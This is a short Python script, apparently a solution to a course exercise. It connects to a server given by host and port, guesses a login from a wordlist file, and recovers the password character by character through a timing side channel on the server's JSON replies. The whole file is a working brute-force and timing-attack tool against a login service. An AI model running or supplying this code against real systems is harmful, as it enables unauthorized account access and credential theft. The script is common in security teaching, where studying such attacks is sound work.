# write your code here
import argparse
import os
import socket
import string
import sys
import json
import time


def get_result(socket_, login_, password_):
    log_pass_pair = {"login": login_, "password": password_}
    request = json.dumps(log_pass_pair)
    socket_.send(request.encode())
    answer = json.loads(socket_.recv(1024).decode())
    return answer["result"]


def check_password(socket_, login_: str, password_: str):
    chars_list = string.ascii_lowercase + string.ascii_uppercase + string.digits
    n = 1

    for char in chars_list:
        start_time = time.perf_counter()
        result = get_result(socket_, login_, str(password_) + str(char))
        end_time = time.perf_counter()
        if result == "Wrong password!" and (end_time - start_time) >= 0.0009:
            return check_password(socket_, login_, password_ + char)
        elif result == "Connection success!":
            return password_ + char


parser = argparse.ArgumentParser()
parser.add_argument("host")
parser.add_argument("port")
arguments = parser.parse_args()

with socket.socket() as connection, open(os.path.join(sys.path[0], "logins.txt"), 'r') as logins_list:
    host = arguments.host
    port = int(arguments.port)
    connection.connect((host, port))
    log_pass_dict = {"login": " ", "password": " "}
    while True:
        login = logins_list.readline().strip()
        if get_result(connection, login, log_pass_dict["password"]) == "Wrong password!":
            log_pass_dict["login"] = login
            break

    log_pass_dict["password"] = check_password(connection, log_pass_dict["login"], "")

print(json.dumps(log_pass_dict))
